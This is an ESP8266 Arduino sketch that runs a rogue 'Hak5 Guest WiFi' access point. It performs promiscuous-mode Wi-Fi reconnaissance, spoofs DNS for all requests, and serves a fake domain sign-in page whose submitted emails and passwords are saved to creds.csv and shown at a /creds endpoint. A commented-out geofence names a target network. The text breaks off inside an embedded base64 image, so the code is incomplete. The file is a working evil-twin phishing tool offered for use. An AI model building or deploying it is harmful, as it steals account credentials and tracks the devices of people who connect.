#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>
#include "./esppl_functions.h"

#include <FS.h>   // SPIFFS

// User configuration
#define SSID_NAME "Hak5 Guest WiFi"
#define SUBTITLE "Sign In to Hak5 Guest WiFi"
#define TITLE "Wi-Fi Domain Sign in:"
#define BODY "Log in with Hak5 domain account"
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

// maximum devices in list
#define maxDevices 100

// recon scan in seconds
#define scanDurationSec 3

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; ESP8266WebServer webServer(80);


// frame data variables
String ssid; String srcMAC; String dstMAC; // Source + Dest MAC address
char srcOctBuffer[2]; char dstOctBuffer[2];
uint8_t ft; uint8_t fst; // frame & subframe type


// store up to 100 devices
// MAC, Type, Channel, RSSI, SSID, Encryption
String devices[maxDevices][6]; int devCount = 0;

// MAC address list of known WiFi networks
String knownNetworks;

void setup() {
    delay(500);
    Serial.begin(115200);

    // initialize promiscuous WiFi scanning
    esppl_init(cb);
    WiFi.mode(WIFI_OFF); wifi_promiscuous_enable(true);

    // scan for 5 seconds and determine if package made it or not
    SPIFFS.begin();
    // wifiRecon(5000);

    // GeoFence: if in range of target network
    // if (isNearby("Big Varonis")) {
        devCount = 0;
        wifiRecon(scanDurationSec);
        fileSetup();
        
        bootTime = lastActivity = millis();

        Serial.println(); Serial.println("Starting Rogue WiFi AP \""+(String) SSID_NAME+"\"");
        WiFi.mode(WIFI_AP);
        WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
        WiFi.softAP(SSID_NAME);

        Serial.print("Initiating Web Server at 172.0.0.1 ...");
        dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
        webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); });
        webServer.on("/creds",[]() { webServer.send(HTTP_CODE, "text/html", creds()); });
        webServer.on("/recon",[]() { webServer.send(HTTP_CODE, "text/html", recon()); });
        webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
        webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
        webServer.begin();
        Serial.println(" done!");
    // }

    // else if (false) {
    //     ESP.deepSleep(0); // edit this to add deep sleep mode
    // }    
}


void loop() { 
    if ((millis()-lastTick)>TICK_TIMER) { lastTick=millis(); } 
    dnsServer.processNextRequest(); webServer.handleClient(); 
    delay(0);
}

// promiscuous mode callback

void cb(esppl_frame_info *info) {

    // gather list of MAC addresses
    // if MAC is already spotted, change status or ignore

    // create network SSID and MAC strings
    ssid = "";
    if (info->ssid_length > 0) { for (int i= 0; i< info->ssid_length; i++) { ssid+= (char) info->ssid[i]; } }

    srcMAC = ""; srcOctBuffer[2];
    for (int i= 0; i< 6; i++) { sprintf(srcOctBuffer, "%02x", info->sourceaddr[i]); srcMAC+=srcOctBuffer; }

    dstMAC = ""; dstOctBuffer[2];
    for (int i= 0; i< 6; i++) { sprintf(dstOctBuffer, "%02x", info->receiveraddr[i]); dstMAC+=dstOctBuffer; }

    ft  = (int) info->frametype; fst = (int) info->framesubtype;

    /* check if src device is known, first pass-over */

    bool srcIsKnown =  deviceKnown(srcMAC);
    
    if (!srcIsKnown && devCount<maxDevices-2) { 
        
        bool deviceLogged = false; // device log status for defaults

        /** MARK AS ACCESS POINT **/
        // if BEACON FRAME, ASSOC RESPONSE, PROBE RESPONSE, REASSOC RESPONSE detected
        
        if((ft==0) and (fst==1 or fst==3 or fst==5 or fst==8 or fst==12)) {
            devices[devCount][1] = "AP";      // Type
            devices[devCount][5] = "unknown"; // Encryption

            if (ssid.equals("")) { devices[devCount][4] = "*hidden network*"; }      // ESSID / Network Name
            else                 { devices[devCount][4] = ssid; }
            deviceLogged = true;
        }

        /** MARK AS STATION DEVICE **/
        // if PROBE REQ, ASSOC REQ, REASSOC REQ detected
        
        else if((ft==0) and (fst==0 or fst==2 or fst==4)) {
            devices[devCount][1] = "Station"; // Type
            devices[devCount][4] = "N/A";      // ESSID
            devices[devCount][5] = "N/A";      // Encryption
            deviceLogged = true;
        }

        // if DATA PACKET and destination MAC is AP
        else if ((ft==1 && fst==0) and isAP(dstMAC)) {
            devices[devCount][1] = "Station"; // Type
            devices[devCount][4] = "N/A";      // ESSID
            devices[devCount][5] = "N/A";      // Encryption
            deviceLogged = true;
        }

        /** ADD DEFAULTS **/
        
        if (deviceLogged) {
            devices[devCount][0] = srcMAC;                 // MAC Address
            devices[devCount][2] = (String) info->channel; // Channel
            devices[devCount][3] = (String) info->rssi;    // RSSI
            devCount++;
        }        
    }

    // second pass-over, sort out stray client devices
    bool dstIsKnown =  deviceKnown(dstMAC);

    if(!dstIsKnown && devCount<maxDevices-2) {

        // if DATA PACKET and source MAC is an AP
        if((ft==1 && fst==0) and isAP(srcMAC)) {
            devices[devCount][0] = dstMAC;
            devices[devCount][1] = "Station";
            devices[devCount][2] = (String) info->channel;
            devices[devCount][3] = (String) info->rssi;
            devices[devCount][4] = "N/A";      // ESSID
            devices[devCount][5] = "N/A";      // Encryption
            devCount++;
        }
    }
}

/***** DEFAULT FILE SETUP *****/

void fileSetup() {

    // check if creds.csv & recon.csv exists
    // if not, create the files and append csv headers
    Serial.println("\nSetting up default files...");

    if (!SPIFFS.exists("/creds.csv")) {
        Serial.println("Database creds.csv not found, creating new file.");
        File tmpCreds = SPIFFS.open("/creds.csv", "w");
        tmpCreds.println("<b>EMAIL</b>,<b>PASSWORD</b>");
        tmpCreds.close();
    }
    else { Serial.println("Database creds.csv found!"); Serial.println("Access credentials at 172.0.0.1/creds"); }    
}

/***** GATHER WIFI RECON *****/

void wifiRecon(int scanDuration) {
    unsigned long interval = scanDuration*1000; // milli to sec
    unsigned long currTime = millis();
    unsigned long prevTime = millis();

    Serial.println(); Serial.println();
    Serial.print("Starting recon for "+String (interval/1000)+" seconds...");
    esppl_sniffing_start();

    while (currTime - prevTime < interval) { // gather recon for 30 seconds, save to recon.csv
        currTime = millis();
        for (int i = 1; i < 15; i++ ) {
            esppl_set_channel(i);
            while (esppl_process_frames()) {
                //
            }
        }
    }    
    
    Serial.println("done!");
    Serial.println("Saving to CSV database \"recon.csv\"");
    Serial.println();
    generateReconDB();

    esppl_sniffing_stop();
    wifi_promiscuous_enable(false);
    WiFi.mode(WIFI_OFF);
}


// generate recon CSV database from devices Array

void generateReconDB() {

    if (!SPIFFS.exists("/recon.csv")) {
        Serial.println("Database recon.csv not found, creating new file.");
        File tmpRecon = SPIFFS.open("/recon.csv", "w");
        tmpRecon.println("<b>MAC Address</b>,<b>Type</b>,<b>Channel</b>,<b>RSSI</b>,<b>Network Name</b>");
        tmpRecon.close();
    }
    else { Serial.println("Database recon.csv found!"); Serial.println("Access recon data at 172.0.0.1/recon"); }

    File tmpRecon = SPIFFS.open("/recon.csv", "a");

    Serial.println("Writing "+ (String) devCount +" devices to database.");
    for(uint8_t i=0; i<devCount; i++){
        for (uint8_t j=0; j<4; j++){
            tmpRecon.print(devices[i][j]);
            tmpRecon.print(",");
        }
        tmpRecon.println(devices[i][4]);
    }

    tmpRecon.close();
    Serial.println("Successfully generated recon.csv!");
}

// check if device is known

bool deviceKnown(String bssid) {
    // look through devices Array for known BSSID
    for (uint8_t i=0; i<devCount; i++) {
        if(devices[i][0].equals(bssid)) {
            return true;
        }
    }
    return false;
}

bool isNearby(String essid) {
    for (uint8_t i=0; i<devCount; i++) {
        if(devices[i][4].equals(essid)) {
            return true;
        }
    }
    return false;
}

bool isAP(String bssid) {
    for (uint8_t i=0; i<devCount; i++) {
        if (devices[i][0].equals(bssid) && devices[i][1].equals("AP")) { return true; }
    }
    return false;
}

/***** WEB SERVER *****/

String input(String argName) {
  String a=webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }

String footer() { return 
  "</div><font size=\"2\"><div class=q><a><p><p><i>Hak5 Guest Wifi Disclaimer</p><p>By using the Wi-Fi services provided by Hak5, you accept the following terms and conditions:</p><p>1) This network is the property of Hak5 Systems and may be accessed only by authorized guests. Unauthorized use of this network is strictly prohibited and subject to criminal prosecution.</p><p>2) The data you send and receive over this network may not be encrypted. Privacy and security safeguards are the responsibility of the user. The Authority may monitor any activity or retrieve any information transmitted through this network, to ensure compliance with Hak5 policies, and with federal, state and local law.</p><p>3) Services are being provided to you AS IS and Hak5 makes no warranty as to their use or performance. Hak5 provides no technical support, warranties or remedies for the services provided. Hak5 does not and cannot warranty the performance or results you may obtain by using the services. Hak5 makes no warranties or representations, express or implied as to any matters, including without limitation non-infringement of third party rights, merchantability, integration, satisfactory quality, or fitness for any particular purpose.</p><p>4) In no event will 0 be liable to you for any damages, software malfunctions, lost data, claims or liability whatsoever or any consequential, indirect, incidental damages, including lost profits or lost savings. Since the service is being provided free of charge, Hak5 assumes no aggregate liability in connection with this agreement.</p><p>5) This agreement will be governed by and construed in accordance with the substantive laws in force in the State of New York, United States of America.</p><br><br>&#169; 2022 Hak5 Systems, All rights reserved.</a></i></div>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #4a90e2; font-family: Open Sans, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #212234; color: #ffffff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><img src=\"data:image/jpeg;base64,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czp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOkRvY3VtZW50SUQ9ImdpbXA6ZG9jaWQ6Z2ltcDo1ZWRlYWI0YS00M2U4LTQ5NDUtYmMzYi03NTMwZjViOTRmNGEiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6ZjA4Y2JkMGMtOWFjOC00OGZhLWFlZTQtZDQxNDRlYzdkMjIzIiB4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ9InhtcC5kaWQ6ZjFjOTJhNGQtZDljMi00YmM0LTgwZGEtZDdiODA2YzFmYTBkIiBkYzpGb3JtYXQ9ImltYWdlL2pwZWciIEdJTVA6QVBJPSIyLjAiIEdJTVA6UGxhdGZvcm09Ik1hYyBPUyIgR0lNUDpUaW1lU3RhbXA9IjE2NTk3NDYxNjExMjU3MTgiIEdJTVA6VmVyc2lvbj0iMi4xMC4yOCIgeG1wOkNyZWF0b3JUb29sPSJHSU1QIDIuMTAiPiA8eG1wTU06SGlzdG9yeT4gPHJkZjpTZXE+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6Y2hhbmdlZD0iLyIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDowNjdmOTZhMy1hM2ZjLTQ1NDItOTNhYy1lZGU1YTE0MTRhN2IiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkdpbXAgMi4xMCAoTWFjIE9TKSIgc3RFdnQ6d2hlbj0iMjAyMi0wOC0wNVQxODozNjowMS0wN